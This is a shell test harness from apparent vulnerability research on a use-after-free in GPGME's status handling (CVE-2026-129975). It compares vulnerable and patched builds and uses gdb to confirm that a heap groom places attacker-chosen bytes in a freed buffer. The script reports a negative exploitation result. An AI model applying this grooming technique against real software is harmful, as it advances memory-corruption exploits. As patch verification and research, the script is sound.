#!/bin/sh
# Attacker-sized GPGME-internal groom outcome for CVE-2026-129975.
# No sanitizer, no network. The fake engine's long GET_LINE keyword makes
# read_status() realloc and then GPGME itself strdup() an attacker-sized chunk
# that reclaims the freed status buffer; a long GOOD line makes the monitor
# return an error before the pointer writeback. Plain glibc still aborts at
# the stale free, so this closes the lab-groom-free limb as a negative result.
set -u
cd "$(dirname "$0")" || exit 2
mkdir -p evidence
pass=0; fail=0
check() {
  if [ "$1" = "$2" ]; then pass=$((pass+1));
  else fail=$((fail+1)); echo "FAIL: $3 (got '$1', want '$2')"; fi
}
hash() { sha256sum "$1" | cut -d' ' -f1; }

check "$(hash ../pinned/engine-gpg.c)" c4ef11bda841fc6d07c83063c6968a6db50db3393af2d661054c59b979311d55 "pinned engine-gpg.c"
check "$(hash ../pinned/fix.patch)" 2fde658ab8b32439c14f58c214f2463b4109aa68d9cbd26c432f17303049c500 "pinned fix.patch"
check "$(hash gpgme-2.2.0/src/engine-gpg.c)" c4ef11bda841fc6d07c83063c6968a6db50db3393af2d661054c59b979311d55 "built vulnerable source"
check "$(hash gpgme-fixed/src/engine-gpg.c)" 10179f7853d9284a21af4ad4ab94753654aa40119f9bdef43852e98482b75b08 "built patched source"

./status-internal-plain-vuln ./fake-internal-gpg.py >evidence/internal-vuln-attack.out 2>&1
echo $? >evidence/internal-vuln-attack.rc
./status-internal-plain-fixed ./fake-internal-gpg.py >evidence/internal-fixed-attack.out 2>&1
echo $? >evidence/internal-fixed-attack.rc
SHORT=1 ./status-internal-plain-vuln ./fake-internal-gpg.py >evidence/internal-vuln-safe.out 2>&1
echo $? >evidence/internal-vuln-safe.rc
SHORT=1 ./status-internal-plain-fixed ./fake-internal-gpg.py >evidence/internal-fixed-safe.out 2>&1
echo $? >evidence/internal-fixed-safe.rc

cat >evidence/internal-gdb.cmd <<'EOF'
set pagination off
break engine-gpg.c:1570
run ./fake-internal-gpg.py
printf "gdb status.buffer=%p cmd.keyword=%p equal=%d\n", gpg->status.buffer, gpg->cmd.keyword, gpg->status.buffer == gpg->cmd.keyword
continue
quit
EOF
gdb -q -batch -x evidence/internal-gdb.cmd ./status-internal-plain-vuln \
  >evidence/internal-gdb.out 2>&1
echo $? >evidence/internal-gdb.rc

check "$(cat evidence/internal-vuln-attack.rc)" 134 "vulnerable internal-groom build aborts"
check "$(grep -c 'mon_cb call=1 keyword=GET_LINE arglen=1020 byte\[1000\]=0x48' evidence/internal-vuln-attack.out)" 1 "attacker byte at chosen offset in GET_LINE"
check "$(grep -c 'mon_cb call=2 keyword=GOOD arglen=600' evidence/internal-vuln-attack.out)" 1 "long GOOD triggers callback error"
check "$(grep -c 'op1 export err=General error' evidence/internal-vuln-attack.out)" 1 "status callback error propagated to op1"
check "$(grep -c 'double free detected in tcache' evidence/internal-vuln-attack.out)" 1 "stale free aborts under plain glibc"
check "$(grep -c 'op2 keylist_start' evidence/internal-vuln-attack.out)" 0 "vulnerable op2 never starts"
check "$(grep -c 'gdb status.buffer=.*cmd.keyword=.*equal=1' evidence/internal-gdb.out)" 1 "internal strdup reclaimed stale status buffer"

check "$(cat evidence/internal-fixed-attack.rc)" 0 "patched internal-groom build exits clean"
check "$(grep -c 'op2 keylist_start err=Success' evidence/internal-fixed-attack.out)" 1 "patched op2 starts"
check "$(grep -c 'double free detected in tcache' evidence/internal-fixed-attack.out)" 0 "patched build does not abort"
check "$(grep -c 'release done' evidence/internal-fixed-attack.out)" 1 "patched process completes"

check "$(cat evidence/internal-vuln-safe.rc)" 0 "short-line vulnerable control exits clean"
check "$(grep -c 'double free detected in tcache' evidence/internal-vuln-safe.out)" 0 "short-line vulnerable control does not abort"
check "$(cat evidence/internal-fixed-safe.rc)" 0 "short-line patched control exits clean"

echo "PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ]
